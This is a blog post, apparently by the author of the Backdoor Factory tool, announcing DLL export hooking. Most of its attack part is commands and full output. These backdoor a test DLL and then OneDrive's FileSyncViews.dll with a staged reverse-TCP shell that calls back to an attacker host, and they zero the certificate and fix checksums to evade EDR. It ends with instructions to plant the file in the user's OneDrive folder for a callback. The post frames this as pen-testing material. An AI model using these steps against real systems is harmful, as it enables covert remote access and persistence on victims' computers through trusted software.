# https://cryptonominom.com/2023/12/22/DLL-Patching.html

Share on:

### TL;DR

BDF now hooks exports in x86\_64 DLLs, providing a potent tool for your pen-testing arsenal. Exclusive updates and features are available for my sponsors. Get it [here](https://github.com/sponsors/secretsquirrel).

### Introduction

While the backdoor-factory (BDF) has been around since 2013, development stopped in 2017, started up again 2020 and has continued since - updates released to my github sponsors. I recently added DLL export hooking for x86\_64 DLLs. Either way, I hope this functionality helps my sponsors on their future engagements, in training, or with testing their EDRs. In the past couple years, I added support for macOS arm64, Linux x64 DYN ELF binaries, and Windows x86\_64 binaries with ControlFlowGuard hooking and text based payload loaders.

For those that don’t know, exports are functions that DLLs provide so that executable programs can import these functions versus reinventing them all the time. Examples of this are common windows APIs, like TCP socket functionality. DLLs provide portability and stability, allowing developers to keep the export APIs the same while changing the underlying functionality without breaking backwards compatibility (hopefully).

Infecting a DLL provides flexibility to attackers as your modified DLL could be used anywhere by any program if you choose wisely.

### How’s it work?

BDF allows you to hook DLL exports. This means that you can hook a DLL export and execute your own code. This is useful for a number of reasons, but the most common is to patch a DLL to do something it wasn’t intended to do. Typically there is space before each export API to allow this.

BDF places a payload loader in the text section. The payload is placed in a code cave in another section. A flag is set before the payload to indicate that the payload has not been executed. When the payload is executed, the flag is set to indicate that the payload has been executed. This is useful to prevent execution of the payload more than once.

The loader will load the payload into memory. The payload with the recovery code will execute, returning execution to the original export API.

Why not hook DLLMain or PE entry (because a DLL is a PE file)? Because you’ll get double execution - once each on DLL load and DLL unload.

### Toy Example

I created a simple DLL with two exports for messagebox popups.

Here’s BDF targeting both DLL exports.

```bash
./backdoor.py -f tests/hello-world.dll PATCH_METHOD=hook_dll_exports \
MODE=dll_loader_single_cave PAYLOAD=text_loader_dll_reverse_tcp_staged_threaded \
HOST=172.16.64.1 PORT=8080 \
EXPORTS=MessageBoxThread1,MessageBoxThread2, CHECKSUM=True \
ZERO_CERT=True
^(;,;)^ - oh hai
         Author:    Joshua Pitts
         Email:     the.midnite.runr[-at ]gmail<d o-t>com
         Twitter:   @ausernamedjosh

         Version:   5.0.0

2023-12-21 23:33:56,INFO,pe_parse.py,[*] Gathering file info
2023-12-21 23:33:56,INFO,hook_dll_exports.py,[*] Selected Payload: text_loader_dll_reverse_tcp_staged_threaded
2023-12-21 23:33:56,INFO,hook_dll_exports.py,[*] Selected Mode: dll_loader_single_cave
2023-12-21 23:33:56,INFO,core.py,[*] Checking for APIs
2023-12-21 23:33:56,INFO,core.py,[*] Parsing data directories
2023-12-21 23:33:57,INFO,core.py,[*] Creating new IAT in new section IDT_IN_CAVE is False
2023-12-21 23:33:57,INFO,core.py,[*] Adding New Section for updated Import Table
2023-12-21 23:33:57,INFO,core.py,[!] Adding b'LoadLibraryA' Thunk in new IAT
2023-12-21 23:33:57,INFO,core.py,[!] Adding b'GetProcAddress' Thunk in new IAT
2023-12-21 23:33:57,INFO,core.py,[!] Adding b'VirtualAlloc' Thunk in new IAT
2023-12-21 23:33:57,INFO,core.py,[!] Adding b'CreateThread' Thunk in new IAT
2023-12-21 23:33:57,INFO,core.py,Building imports
2023-12-21 23:33:57,ERROR,pe_parse.py,No DISK_OFFSET provided using 0
2023-12-21 23:33:57,INFO,pe_parse.py,[*] Gathering file info
2023-12-21 23:33:57,INFO,core.py,[*] Checking updated IAT for thunks
2023-12-21 23:33:57,INFO,core.py,[*] Checking for APIs
2023-12-21 23:33:57,INFO,core.py,[*] Parsing data directories
2023-12-21 23:33:57,INFO,core.py,[*] The APIs have been located in the file -- or created :D
2023-12-21 23:33:57,INFO,text_loader_dll_reverse_tcp_staged_threaded.py,CreateThread stub len: 0x43, 67
2023-12-21 23:33:57,INFO,dll_loader_single_cave.py,txt_vrt_slck_loc: 6442458755, hex: 0x180001e83
2023-12-21 23:33:57,INFO,dll_loader_single_cave.py,Loader len: 0xcf, 207
2023-12-21 23:33:57,INFO,dll_loader_single_cave.py,payload_stub len: 0x184, 388
2023-12-21 23:33:57,INFO,dll_loader_single_cave.py,ResumeEXE stub len: 1
2023-12-21 23:33:57,INFO,dll_loader_single_cave.py,slack_space_size: hex: 0x17d, 381
2023-12-21 23:33:57,INFO,dll_loader_single_cave.py,Text slack space is large enough
2023-12-21 23:33:57,INFO,core.py,[*] Looking for caves that will fit the minimum shellcode length of 460
2023-12-21 23:33:57,INFO,core.py,[*] All caves lengths: 460
2023-12-21 23:33:57,INFO,core.py,[*] Attempting PE File Automatic Patching
2023-12-21 23:33:57,INFO,core.py,            [!] Selected: 1; Section Name: b'.reloc\x00\x00';             Cave begin: 0x261a;             End: 0x27ea;             Cave Size: 464;             Payload Size: 460             SectionFlags: 0x42000040
2023-12-21 23:33:57,INFO,dll_core.py,Found Export: 1, [10158, 7086, b'MessageBoxThread1']
2023-12-21 23:33:57,INFO,dll_core.py,Export Addresses: [4096, 7036, 1024]
2023-12-21 23:33:57,INFO,dll_core.py,Found Export: 2, [10176, 7104, b'MessageBoxThread2']
2023-12-21 23:33:57,INFO,dll_core.py,Export Addresses: [4144, 7040, 1072]
2023-12-21 23:33:57,INFO,text_loader_dll_reverse_tcp_staged_threaded.py,CreateThread stub len: 0x43, 67
2023-12-21 23:33:57,INFO,support.py,[*] Patching file with patch_instr
2023-12-21 23:33:57,INFO,core.py,[*] Updating PE file checksum
2023-12-21 23:33:57,INFO,backdoor.py,[*] Patching successful!
2023-12-21 23:33:57,INFO,backdoor.py,[*] Output in backdoored/hello-world.dll
```

To execute this DLL you would use rundll32.exe as so: `rundll32.exe hello-world.dll,MessageBoxThread1`.

Now to explain each part of the command:
PATCH\_METHOD - This is the method to use to patch the file. In this case, we’re using hook\_dll\_exports.
MODE - This is the mode to use for the payload. In this case, we’re using dll\_loader\_single\_cave. This means that we’re going to use a single code cave to load the payload specific to DLLs.
PAYLOAD - This is the payload to use. In this case, we’re using text\_loader\_dll\_reverse\_tcp\_staged\_threaded. This means that we’re going to use a payload that supports the text loader that will connect back to the host and port specified.
HOST - This is the host to connect back to.
PORT - This is the port to connect back to.
EXPORTS - These are the exports to hook. In this case, we’re hooking both MessageBoxThread1 and MessageBoxThread2. You can all use `all` to hook all exports, not recommended generally for large DLLs, best to manually test each export.
CHECKSUM - This is a flag to update the PE file checksum. This is useful for some EDRs that check the PE file checksum.
ZERO\_CERT - This is a flag to zero out the certificate table. As the certificate will not be valid, let’s remove it. Also, BDF supports code signing, if you bring your own signing certificate.

### Real World Example

I’ve known about this OneDrive DLL hijacking issue for a long time. Before this [report](https://www.bitdefender.com/files/News/CaseStudies/study/424/Bitdefender-PR-Whitepaper-SLOneDriveCyberJack-creat6318-en-EN.pdf) from BitDefender. I didn’t report it, as Microsoft wouldn’t consider this instance of DLL hijacking a vulnerability since it doesn’t cross a security boundary ( [REF](https://msrc.microsoft.com/blog/2018/04/triaging-a-dll-planting-vulnerability/)). Also by the fact that this DLL hijacking bug still exists.

According to the report, the attackers targeted DLLs loaded in `%LOCALAPPDATA%\Microsoft\OneDrive\` and they targeted secur32.dll via the GetUserNameExW exported API. In short, they patched secure32.dll export so that it returns 1. And the application worked as expected. The GetUserNameExW API was an forwarded export, meaning the API was not contained in secure32, in fact it is located in sspicli.dll. Export forwarding abuse is not new, it’s been abused [before](https://news.sophos.com/en-us/2023/07/26/into-the-tank-with-nitrogen/).

When you load OneDrive in procmon, you can see many DLLs that are not found in the `%LOCALAPPDATA%` directory. So why did they select secur32.dll? They probably did a fair bit of testing to determine that patching that API did not affect program execution. However, when you decided to create a personal vault with OneDrive, it will move all of its application files from `%LOCALAPPDATA%` to `c:\ProgramData` and `c:\program files`, which require admin rights to write to. You can no longer hijack OneDrive with secur32.dll.

Before the upgrade, many DLLs can be hijacked and OneDrive is enabled by default. As BDF does not support export forwarded APIs (at this time), we’ll use a different DLL to demonstrate how BDF could be used in this scenario. For example, when targeting the secur32.dll GetUserNameExW export, BDF will fail as it is a forwarded export. BDF will tell you this and list the available exports that can be hooked. As the output is a comma separated list, you can use these with the `EXPORTS` option to specify the export to hook and remove exports that are not needed.

```bash

./backdoor.py -f tests/secur32.dll PATCH_METHOD=hook_dll_exports \
MODE=dll_loader_single_cave \
PAYLOAD=text_loader_dll_reverse_tcp_staged_threaded \
HOST=172.16.64.1 PORT=8080 EXPORTS=GetUserNameExW -Z
^(;,;)^ - nice to see you
         Author:    Joshua Pitts
         Email:     the.midnite.runr[-at ]gmail<d o-t>com
         Twitter:   @ausernamedjosh

         Version:   5.0.0

2023-12-22 14:22:07,INFO,pe_parse.py,[*] Gathering file info
2023-12-22 14:22:07,INFO,hook_dll_exports.py,[*] Selected Payload: text_loader_dll_reverse_tcp_staged_threaded
2023-12-22 14:22:07,INFO,hook_dll_exports.py,[*] Selected Mode: dll_loader_single_cave
2023-12-22 14:22:07,INFO,core.py,[*] Checking for APIs
2023-12-22 14:22:07,INFO,core.py,[*] Parsing data directories
2023-12-22 14:22:07,INFO,core.py,[*] Creating new IAT in new section IDT_IN_CAVE is False
2023-12-22 14:22:07,INFO,core.py,[*] Adding New Section for updated Import Table
2023-12-22 14:22:07,INFO,core.py,[!] Adding b'CreateThread' Thunk in new IAT
2023-12-22 14:22:07,INFO,core.py,[!] Adding b'LoadLibraryA' Thunk in new IAT
2023-12-22 14:22:07,INFO,core.py,[!] Adding b'VirtualAlloc' Thunk in new IAT
2023-12-22 14:22:07,INFO,core.py,Building imports
2023-12-22 14:22:07,ERROR,pe_parse.py,No DISK_OFFSET provided using 0
2023-12-22 14:22:07,INFO,pe_parse.py,[*] Gathering file info
2023-12-22 14:22:07,INFO,core.py,[*] Checking updated IAT for thunks
2023-12-22 14:22:07,INFO,core.py,[*] Checking for APIs
2023-12-22 14:22:07,INFO,core.py,[*] Parsing data directories
2023-12-22 14:22:07,INFO,core.py,[*] The APIs have been located in the file -- or created :D
2023-12-22 14:22:07,INFO,text_loader_dll_reverse_tcp_staged_threaded.py,CreateThread stub len: 0x43, 67
2023-12-22 14:22:07,INFO,dll_loader_single_cave.py,txt_vrt_slck_loc: 6442466055, hex: 0x180003b07
2023-12-22 14:22:07,INFO,dll_loader_single_cave.py,Loader len: 0xcf, 207
2023-12-22 14:22:07,INFO,dll_loader_single_cave.py,payload_stub len: 0x184, 388
2023-12-22 14:22:07,INFO,dll_loader_single_cave.py,ResumeEXE stub len: 1
2023-12-22 14:22:07,INFO,dll_loader_single_cave.py,slack_space_size: hex: 0xf9, 249
2023-12-22 14:22:07,INFO,dll_loader_single_cave.py,Text slack space is large enough
2023-12-22 14:22:07,INFO,core.py,[*] Looking for caves that will fit the minimum shellcode length of 460
2023-12-22 14:22:07,INFO,core.py,[*] All caves lengths: 460
2023-12-22 14:22:07,INFO,core.py,[*] Attempting PE File Automatic Patching
2023-12-22 14:22:07,INFO,core.py,            [!] Selected: 4; Section Name: b'.rdata1\x00';             Cave begin: 0x7529;             End: 0x76f9;             Cave Size: 464;             Payload Size: 460             SectionFlags: 0xc0000040
2023-12-22 14:22:07,INFO,dll_core.py,Found Export: 29, [22187, 18091, b'GetUserNameExW']
2023-12-22 14:22:07,INFO,dll_core.py,Export Info: [22164, 15820, 18068, True]
2023-12-22 14:22:07,INFO,dll_core.py,Export Type: True
2023-12-22 14:22:07,ERROR,dll_core.py,Your selected exports,GetUserNameExW, were not Found
Here's the APIs is in the DLL available for hooking:
[*]Exports that can be used: AcceptSecurityContext,AcquireCredentialsHandleA,AcquireCredentialsHandleW,GetComputerObjectNameW,GetSecurityUserInfo,SecpFreeMemory,SecpTranslateName,SecpTranslateNameEx,TranslateNameA,TranslateNameW,

[!]Exports that cannot be used as they are forwarded Exports: AddCredentialsA,AddCredentialsW,AddSecurityPackageA,AddSecurityPackageW,ApplyControlToken,ChangeAccountPasswordA,ChangeAccountPasswordW,CloseLsaPerformanceData,CollectLsaPerformanceData,CompleteAuthToken,CredMarshalTargetInfo,CredUnmarshalTargetInfo,DecryptMessage,DeleteSecurityContext,DeleteSecurityPackageA,DeleteSecurityPackageW,EncryptMessage,EnumerateSecurityPackagesA,EnumerateSecurityPackagesW,ExportSecurityContext,FreeContextBuffer,FreeCredentialsHandle,GetComputerObjectNameA,GetUserNameExA,GetUserNameExW,ImpersonateSecurityContext,ImportSecurityContextA,ImportSecurityContextW,InitSecurityInterfaceA,InitSecurityInterfaceW,InitializeSecurityContextA,InitializeSecurityContextW,LsaCallAuthenticationPackage,LsaConnectUntrusted,LsaDeregisterLogonProcess,LsaEnumerateLogonSessions,LsaFreeReturnBuffer,LsaGetLogonSessionData,LsaLogonUser,LsaLookupAuthenticationPackage,LsaRegisterLogonProcess,LsaRegisterPolicyChangeNotification,LsaUnregisterPolicyChangeNotification,MakeSignature,OpenLsaPerformanceData,QueryContextAttributesA,QueryContextAttributesW,QueryCredentialsAttributesA,QueryCredentialsAttributesW,QuerySecurityContextToken,QuerySecurityPackageInfoA,QuerySecurityPackageInfoW,RevertSecurityContext,SaslAcceptSecurityContext,SaslEnumerateProfilesA,SaslEnumerateProfilesW,SaslGetContextOption,SaslGetProfilePackageA,SaslGetProfilePackageW,SaslIdentifyPackageA,SaslIdentifyPackageW,SaslInitializeSecurityContextA,SaslInitializeSecurityContextW,SaslSetContextOption,SealMessage,SeciAllocateAndSetCallFlags,SeciAllocateAndSetIPAddress,SeciFreeCallContext,SetContextAttributesA,SetContextAttributesW,SetCredentialsAttributesA,SetCredentialsAttributesW,SspiCompareAuthIdentities,SspiCopyAuthIdentity,SspiDecryptAuthIdentity,SspiEncodeAuthIdentityAsStrings,SspiEncodeStringsAsAuthIdentity,SspiEncryptAuthIdentity,SspiExcludePackage,SspiFreeAuthIdentity,SspiGetTargetHostName,SspiIsAuthIdentityEncrypted,SspiLocalFree,SspiMarshalAuthIdentity,SspiPrepareForCredRead,SspiPrepareForCredWrite,SspiUnmarshalAuthIdentity,SspiValidateAuthIdentity,SspiZeroAuthIdentity,UnsealMessage,VerifySignature,

2023-12-22 14:22:07,ERROR,backdoor.py,[!] Patching Failed
```

However, hooking the exports that are available in the secur32.dll will not result in code execution as they are not called by OneDrive or its other imported DLLs.

After some testing I found that the FileSyncViews.dll with the `StartQtApp@QtViews@@YAXAEAHPEAVIResourceProvider@@PEAVICrossPlatformWindowManager@@@Z` export api to be a good candidate. This export is not forwarded and is executed on OneDrive startup.

```bash

 ./backdoor.py -q -f tests/FileSyncViews.dll PATCH_METHOD=hook_dll_exports \
 MODE=dll_loader_single_cave PAYLOAD=text_loader_dll_reverse_tcp_staged_threaded \
 HOST=172.16.64.1 PORT=9090 \
 EXPORTS='?StartQtApp@QtViews@@YAXAEAHPEAVIResourceProvider@@PEAVICrossPlatformWindowManager@@@Z' \
 TESTING=True CHECKSUM=True ZERO_CERT=True  -M manual
         BDF-ng

         Author:    Joshua Pitts
         Email:     the.midnite.runr[-at ]gmail<d o-t>com
         Twitter:   @ausernamedjosh

         Version:   5.0.0

2023-12-22 18:12:29,INFO,pe_parse.py,[*] Gathering file info
2023-12-22 18:12:30,INFO,core.py,[*] Setting patch_instr for overwriting certificate table pointer
2023-12-22 18:12:30,INFO,hook_dll_exports.py,[*] Selected Payload: text_loader_dll_reverse_tcp_staged_threaded
2023-12-22 18:12:30,INFO,hook_dll_exports.py,[*] Selected Mode: dll_loader_single_cave
2023-12-22 18:12:30,INFO,core.py,[*] Checking for APIs
2023-12-22 18:12:30,INFO,core.py,[*] Parsing data directories
2023-12-22 18:12:30,INFO,core.py,[*] Creating new IAT in new section IDT_IN_CAVE is False
2023-12-22 18:12:30,INFO,core.py,[*] Adding New Section for updated Import Table
2023-12-22 18:12:30,INFO,core.py,[!] Adding b'CreateThread' Thunk in new IAT
2023-12-22 18:12:30,INFO,core.py,[!] Adding b'LoadLibraryA' Thunk in new IAT
2023-12-22 18:12:30,INFO,core.py,[!] Adding b'VirtualAlloc' Thunk in new IAT
2023-12-22 18:12:30,INFO,core.py,Building imports
2023-12-22 18:12:30,ERROR,pe_parse.py,No DISK_OFFSET provided using 0
2023-12-22 18:12:30,INFO,pe_parse.py,[*] Gathering file info
2023-12-22 18:12:30,INFO,core.py,[*] Checking updated IAT for thunks
2023-12-22 18:12:30,INFO,core.py,[*] Checking for APIs
2023-12-22 18:12:30,INFO,core.py,[*] Parsing data directories
2023-12-22 18:12:30,INFO,core.py,[*] The APIs have been located in the file -- or created :D
2023-12-22 18:12:30,INFO,text_loader_dll_reverse_tcp_staged_threaded.py,CreateThread stub len: 0x43, 67
2023-12-22 18:12:30,INFO,dll_loader_single_cave.py,txt_vrt_slck_loc: 6443051051, hex: 0x18009282b
2023-12-22 18:12:30,INFO,dll_loader_single_cave.py,Loader len: 0xcf, 207
2023-12-22 18:12:30,INFO,dll_loader_single_cave.py,payload_stub len: 0x184, 388
2023-12-22 18:12:30,INFO,dll_loader_single_cave.py,ResumeEXE stub len: 1
2023-12-22 18:12:30,INFO,dll_loader_single_cave.py,slack_space_size: hex: 0x1d5, 469
2023-12-22 18:12:30,INFO,dll_loader_single_cave.py,Text slack space is large enough
2023-12-22 18:12:30,INFO,core.py,[*] Looking for caves that will fit the minimum shellcode length of 460
2023-12-22 18:12:30,INFO,core.py,[*] All caves lengths: 460
2023-12-22 18:12:30,INFO,core.py,############################################################
The following caves can be used to inject code and possibly
continue execution.
**Don't like what you see? ignore or quit and view options.**
############################################################
[*] Cave 1 length as int: 460
[*] Available caves:
1. Section Name: b'.text\x00\x00\x00'; Section Begin: 0x400 End: 0x91e00; Cave begin: 0x91c2f End: 0x91dff; Cave Size: 464; Characteristics: 0x60000020
2. Section Name: b'.rdata1\x00'; Section Begin: 0x313200 End: 0x314200; Cave begin: 0x313589 End: 0x313759; Cave Size: 464; Characteristics: 0xc0000040
3. Section Name: b'.rdata1\x00'; Section Begin: 0x313200 End: 0x314200; Cave begin: 0x31375d End: 0x31392d; Cave Size: 464; Characteristics: 0xc0000040
4. Section Name: b'.rdata1\x00'; Section Begin: 0x313200 End: 0x314200; Cave begin: 0x313931 End: 0x313b01; Cave Size: 464; Characteristics: 0xc0000040
5. Section Name: b'.rdata1\x00'; Section Begin: 0x313200 End: 0x314200; Cave begin: 0x313b05 End: 0x313cd5; Cave Size: 464; Characteristics: 0xc0000040
6. Section Name: b'.rdata1\x00'; Section Begin: 0x313200 End: 0x314200; Cave begin: 0x313cd9 End: 0x313ea9; Cave Size: 464; Characteristics: 0xc0000040
7. Section Name: b'.rdata1\x00'; Section Begin: 0x313200 End: 0x314200; Cave begin: 0x313ead End: 0x31407d; Cave Size: 464; Characteristics: 0xc0000040
**************************************************
[!] Enter your selection: 7
[!] Using selection: 7
==================================================
2023-12-22 18:12:32,INFO,dll_core.py,Found Export: 28, [3074938, 3070330, b'?StartQtApp@QtViews@@YAXAEAHPEAVIResourceProvider@@PEAVICrossPlatformWindowManager@@@Z']
2023-12-22 18:12:32,INFO,dll_core.py,Export Info: [24656, 3066692, 21584, False]
2023-12-22 18:12:32,INFO,dll_core.py,Hooking this function
2023-12-22 18:12:32,INFO,text_loader_dll_reverse_tcp_staged_threaded.py,CreateThread stub len: 0x43, 67
2023-12-22 18:12:32,INFO,support.py,[*] Patching file with patch_instr
2023-12-22 18:12:32,INFO,core.py,[*] Updating PE file checksum
2023-12-22 18:12:33,INFO,backdoor.py,[*] Patching successful!
2023-12-22 18:12:33,INFO,backdoor.py,[*] Output in backdoored/FileSyncViews.dll
```

Using the same settings as above, except for the `EXPORTS` option, we can see that the export is hooked and the payload is patched into the binary. Now, place this bianry in `%LOCALAPPDATA%\Microsoft\OneDrive\` and start OneDrive. You’ll see a connection back to your host and port.

### Conclusion

There you have it. There are additional ways to do file infection on DLLs that haven’t been discussed yet publicly, probably with smaller initial payload loader. I’ll get to that in a future code release and blog post.

Join my sponsor community on GitHub to access advanced features, personalized support, and early releases. Your sponsorship fuels ongoing development and innovation. [Become a Sponsor](https://github.com/secretsquirrel/sponsors).

* * *

[<\\
\\
Previous Post\\
\\
Ukraine War](https://cryptonominom.com/2023/12/05/Ukraine-war.html "Ukraine War") [>\\
\\
Blog Archive\\
\\
Archive of all previous blog posts](https://cryptonominom.com/archive.html "Blog Archive")